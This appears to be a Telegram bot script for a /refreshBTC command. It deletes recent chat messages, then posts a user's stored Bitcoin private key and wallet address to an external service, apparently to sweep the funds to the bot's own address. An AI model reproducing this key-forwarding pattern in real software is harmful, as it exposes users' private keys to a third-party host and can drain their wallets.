/*CMD
  command: /refreshBTC
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/


if (request.data) {
  var message_id = request.message.message_id
  var chat_id = request.message.chat.id

  Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id
  })
Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id-1
  })
Api.deleteMessage({
    chat_id: chat_id,
    message_id: message_id-2
  })
}
var wallpk = Bot.getProperty("wallpBTC"+user.telegramid)
var w = Bot.getProperty("wallBTC"+user.telegramid)
var addres = Bot.getProperty("BTC_ADDRESS","🛑 Not Set")
HTTP.post({
url: "https://crypto-btc.up.railway.app/depositBTC",
  success: "/completedmkb4",
  body : {'address': addres , 'privateKey': wallpk ,'my_address':w,'amount': 0}
  })
